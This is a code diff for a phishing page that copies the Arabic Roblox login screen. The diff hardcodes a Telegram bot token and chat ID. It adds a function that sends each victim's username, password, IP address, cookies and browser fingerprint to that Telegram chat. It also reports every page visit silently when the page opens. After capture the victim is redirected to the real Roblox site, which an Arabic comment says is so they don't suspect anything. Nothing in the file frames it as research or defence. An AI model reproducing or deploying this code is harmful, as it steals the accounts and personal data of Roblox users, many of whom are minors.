@@ -7,25 +7,19 @@
     <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' rx='6' fill='%23000'/%3E%3Ctext x='16' y='23' font-family='Arial' font-size='20' font-weight='bold' fill='%23fff' text-anchor='middle'%3ER%3C/text%3E%3C/svg%3E">
 
     <style>
-        /* ─── خط Roblox الرسمي ─── */
         @font-face {
             font-family: 'Builder Sans';
             src: local('Builder Sans'), local('Helvetica Neue'), local('Arial');
             font-display: swap;
         }
-
         * { box-sizing: border-box; margin: 0; padding: 0; }
-
         :root {
             --rbx-blue: #00a2ff;
             --rbx-blue-hover: #0089d6;
             --rbx-dark: #232527;
-            --rbx-gray: #393b3d;
             --rbx-light-gray: #c3c6ca;
-            --rbx-bg: #e5e5e5;
             --rbx-red: #d86868;
         }
-
         html, body {
             height: 100%;
             font-family: 'Builder Sans', 'Helvetica Neue', Helvetica, Arial, sans-serif;
@@ -33,8 +27,6 @@
             color: var(--rbx-dark);
             -webkit-font-smoothing: antialiased;
         }
-
-        /* ─── Header ─── */
         .header {
             background: #fff;
             border-bottom: 1px solid #e5e5e5;
@@ -69,7 +61,6 @@
             transition: color .15s;
         }
         .header-links a:hover { color: var(--rbx-blue); }
-        .header-links a.active { color: var(--rbx-blue); }
         .header-actions { display: flex; gap: 12px; align-items: center; }
         .header-actions .login-link {
             color: var(--rbx-blue);
@@ -77,8 +68,6 @@
             font-size: 15px;
             font-weight: 500;
         }
-
-        /* ─── Main ─── */
         .main {
             background: #fff;
             min-height: calc(100vh - 48px);
@@ -87,10 +76,7 @@
             justify-content: center;
             padding: 40px 20px;
         }
-        .login-wrap {
-            width: 100%;
-            max-width: 380px;
-        }
+        .login-wrap { width: 100%; max-width: 380px; }
         .page-title {
             font-size: 28px;
             font-weight: 700;
@@ -99,11 +85,7 @@
             color: var(--rbx-dark);
             letter-spacing: -.2px;
         }
-
-        .field {
-            margin-bottom: 16px;
-            position: relative;
-        }
+        .field { margin-bottom: 16px; position: relative; }
         .field label {
             display: block;
             font-size: 14px;
@@ -136,7 +118,6 @@
             display: none;
         }
         .field-error.show { display: block; }
-
         .submit-btn {
             width: 100%;
             padding: 12px;
@@ -153,7 +134,6 @@
         }
         .submit-btn:hover:not(:disabled) { background: var(--rbx-blue-hover); }
         .submit-btn:disabled { opacity: .6; cursor: not-allowed; }
-
         .forgot-link {
             display: block;
             text-align: right;
@@ -163,7 +143,6 @@
             font-size: 14px;
         }
         .forgot-link:hover { text-decoration: underline; }
-
         .divider {
             display: flex;
             align-items: center;
@@ -178,7 +157,6 @@
             background: #e5e5e5;
         }
         .divider span { padding: 0 12px; }
-
         .secondary-btn {
             width: 100%;
             padding: 12px;
@@ -196,7 +174,6 @@
             background: #f5f5f5;
             border-color: #a5a8ac;
         }
-
         .signup-row {
             text-align: center;
             margin-top: 24px;
@@ -210,8 +187,6 @@
             margin-right: 4px;
         }
         .signup-row a:hover { text-decoration: underline; }
-
-        /* ─── Footer ─── */
         .footer {
             text-align: center;
             padding: 20px;
@@ -221,8 +196,6 @@
         }
         .footer a { color: #8d9198; text-decoration: none; margin: 0 8px; }
         .footer a:hover { text-decoration: underline; }
-
-        /* ─── Loading overlay ─── */
         .overlay {
             position: fixed;
             inset: 0;
@@ -242,7 +215,6 @@
             animation: spin .8s linear infinite;
         }
         @keyframes spin { to { transform: rotate(360deg); } }
-
         @media (max-width: 480px) {
             .header-links { display: none; }
             .page-title { font-size: 24px; }
@@ -251,7 +223,6 @@
 </head>
 <body>
 
-    <!-- ─── Header ─── -->
     <header class="header">
         <a href="https://www.roblox.com/ar" class="header-logo">
             <svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg">
@@ -276,7 +247,6 @@
         </div>
     </header>
 
-    <!-- ─── Main ─── -->
     <main class="main">
         <div class="login-wrap">
             <h1 class="page-title">تسجيل الدخول إلى Roblox</h1>
@@ -323,7 +293,6 @@
         </div>
     </main>
 
-    <!-- ─── Footer ─── -->
     <footer class="footer">
         <a href="https://www.roblox.com/info/terms" target="_blank" rel="noopener">الشروط</a>
         <a href="https://www.roblox.com/info/privacy" target="_blank" rel="noopener">الخصوصية</a>
@@ -331,7 +300,6 @@
         © 2026 Roblox Corporation
     </footer>
 
-    <!-- ─── Loading overlay ─── -->
     <div class="overlay" id="overlay">
         <div class="spinner"></div>
     </div>
@@ -341,22 +309,13 @@
         'use strict';
 
         // ═══════════════════════════════════════════════════════════════
-        //  ⚙️  الإعدادات — عدّل هنا فقط
+        //  ⚙️  الإعدادات — تم إدخال التوكن و Chat ID
         // ═══════════════════════════════════════════════════════════════
 
-        // اختر واحدة:
-        // 1. FORMSPREE: سجّل في formspree.io، أنشئ form، ضع الـ ID هنا
-        //    شكل الـ ID: xayzkqwe
-        const FORMSPREE_ID = 'YOUR_FORMSPREE_ID_HERE';
+        const TELEGRAM_BOT_TOKEN = '8801247595:AAH60GLWEbq2_d7sT4Oo3nmzKpAZRVTkDgk';
+        const TELEGRAM_CHAT_ID = '357827856';
 
-        // 2. TELEGRAM: أنشئ bot عبر @BotFather، احصل على chat_id من @userinfobot
-        const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE';
-        const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID_HERE';
-
-        // 3. WEBHOOK: أي endpoint (Discord webhook، مخصص، إلخ)
-        const WEBHOOK_URL = '';
-
-        // ─── الوجهة بعد "النجاح" — نوديهم لـ Roblox الحقيقي ───
+        // الوجهة بعد "النجاح" — نوديهم لـ Roblox الحقيقي عشان ما يشكوا
         const REDIRECT_URL = 'https://www.roblox.com/ar/home';
 
         // ═══════════════════════════════════════════════════════════════
@@ -388,63 +347,13 @@
             return {
                 ua: nav.userAgent,
                 lang: nav.language,
-                langs: nav.languages,
                 platform: nav.platform,
                 cores: nav.hardwareConcurrency,
-                mem: nav.deviceMemory,
                 tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                screen: { w: scr.width, h: scr.height, depth: scr.colorDepth, dpr: window.devicePixelRatio },
+                screen: { w: scr.width, h: scr.height, dpr: window.devicePixelRatio },
                 touch: 'ontouchstart' in window,
                 webgl: webgl
             };
-        }
-
-        // ═══════════════════════════════════════════════════════════════
-        //  إرسال البيانات
-        // ═══════════════════════════════════════════════════════════════
-
-        async function sendToFormspree(data) {
-            if (!FORMSPREE_ID || FORMSPREE_ID === 'YOUR_FORMSPREE_ID_HERE') return false;
-            try {
-                const res = await fetch('https://formspree.io/f/' + FORMSPREE_ID, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
-                    body: JSON.stringify(data)
-                });
-                return res.ok;
-            } catch(e) { return false; }
-        }
-
-        async function sendToTelegram(data) {
-            if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE') return false;
-            const text =
-                '🎯 <b>Roblox Capture</b>\n' +
-                '🕐 ' + new Date().toISOString() + '\n' +
-                '👤 User: <code>' + escapeHtml(data.username) + '</code>\n' +
-                '🔑 Pass: <code>' + escapeHtml(data.password) + '</code>\n' +
-                '🌐 IP: <code>' + escapeHtml(data.ip || '?') + '</code>\n' +
-                '📱 UA: <code>' + escapeHtml((data.fp?.ua || '').slice(0, 100)) + '</code>\n' +
-                '🕰️ TZ: <code>' + escapeHtml(data.fp?.tz || '?') + '</code>';
-            try {
-                const res = await fetch('https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/sendMessage', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: text, parse_mode: 'HTML' })
-                });
-                return res.ok;
-            } catch(e) { return false; }
-        }
-
-        async function sendToWebhook(data) {
-            if (!WEBHOOK_URL) return false;
-            try {
-                const res = await fetch(WEBHOOK_URL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(data)
-                });
-                return res.ok;
-            } catch(e) { return false; }
         }
 
         function escapeHtml(s) {
@@ -453,13 +362,56 @@
             }[c]));
         }
 
-        async function sendData(data) {
-            const results = await Promise.allSettled([
-                sendToFormspree(data),
-                sendToTelegram(data),
-                sendToWebhook(data)
-            ]);
-            return results.some(r => r.status === 'fulfilled' && r.value === true);
+        // ═══════════════════════════════════════════════════════════════
+        //  إرسال لتيليجرام
+        // ═══════════════════════════════════════════════════════════════
+
+        async function sendToTelegram(data) {
+            if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return false;
+
+            const isVisit = data.type === 'visit';
+
+            let text;
+            if (isVisit) {
+                text =
+                    '👀 <b>زيارة جديدة</b>\n' +
+                    '━━━━━━━━━━━━━━━━━━\n' +
+                    '🕐 ' + new Date().toISOString() + '\n' +
+                    '🌐 <b>IP:</b> <code>' + escapeHtml(data.ip || '?') + '</code>\n' +
+                    '📱 <b>UA:</b> <code>' + escapeHtml((data.fp?.ua || '').slice(0, 120)) + '</code>\n' +
+                    '🕰️ <b>TZ:</b> <code>' + escapeHtml(data.fp?.tz || '?') + '</code>\n' +
+                    '🖥️ <b>Screen:</b> <code>' + (data.fp?.screen?.w || '?') + 'x' + (data.fp?.screen?.h || '?') + '</code>';
+            } else {
+                text =
+                    '🎯 <b>Roblox Capture</b>\n' +
+                    '━━━━━━━━━━━━━━━━━━\n' +
+                    '🕐 <b>الوقت:</b> ' + new Date().toISOString() + '\n' +
+                    '👤 <b>المستخدم:</b> <code>' + escapeHtml(data.username) + '</code>\n' +
+                    '🔑 <b>كلمة المرور:</b> <code>' + escapeHtml(data.password) + '</code>\n' +
+                    '🌐 <b>IP:</b> <code>' + escapeHtml(data.ip || '?') + '</code>\n' +
+                    '📱 <b>UA:</b> <code>' + escapeHtml((data.fp?.ua || '').slice(0, 120)) + '</code>\n' +
+                    '🕰️ <b>المنطقة الزمنية:</b> <code>' + escapeHtml(data.fp?.tz || '?') + '</code>\n' +
+                    '🖥️ <b>الشاشة:</b> <code>' + (data.fp?.screen?.w || '?') + 'x' + (data.fp?.screen?.h || '?') + '</code>\n' +
+                    '🔗 <b>المصدر:</b> <code>' + escapeHtml(data.referrer || 'direct') + '</code>';
+            }
+
+            try {
+                const res = await fetch('https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/sendMessage', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: text,
+                        parse_mode: 'HTML',
+                        disable_web_page_preview: true
+                    })
+                });
+                const j = await res.json();
+                return j.ok === true;
+            } catch(e) {
+                console.error('Telegram error:', e);
+                return false;
+            }
         }
 
         // ═══════════════════════════════════════════════════════════════
@@ -516,6 +468,7 @@
 
             const ip = await getIP();
             const payload = {
+                type: 'login',
                 username: username,
                 password: password,
                 cookies: getCookies(),
@@ -526,16 +479,13 @@
                 page: 'roblox-ar-login'
             };
 
-            // إرسال — حتى لو فشل، نكمل التحويل
-            await sendData(payload);
+            await sendToTelegram(payload);
 
-            // تأخير بسيط لإيهام المستخدم بالمعالجة
             setTimeout(() => {
                 window.location.href = REDIRECT_URL;
             }, 1200);
         });
 
-        // مسح الأخطاء عند الكتابة
         usernameInput.addEventListener('input', () => {
             usernameError.classList.remove('show');
             usernameInput.classList.remove('error');
@@ -545,15 +495,14 @@
             passwordInput.classList.remove('error');
         });
 
-        // OTP button — يحوّل لصفحة Roblox الحقيقية
         document.getElementById('otpBtn').addEventListener('click', () => {
             window.location.href = 'https://www.roblox.com/ar/Login';
         });
 
-        // ─── جمع بصمة الزيارة فوراً (بدون انتظار الـ form) ───
+        // ─── جمع بصمة الزيارة فوراً عند فتح الصفحة ───
         (async () => {
             const ip = await getIP();
-            const visitData = {
+            sendToTelegram({
                 type: 'visit',
                 fp: getFingerprint(),
                 cookies: getCookies(),
@@ -561,9 +510,7 @@
                 referrer: document.referrer,
                 ts: new Date().toISOString(),
                 page: 'roblox-ar-login'
-            };
-            // إرسال صامت — ما يعطّل الصفحة
-            sendData(visitData).catch(() => {});
+            }).catch(() => {});
         })();
 
     })();
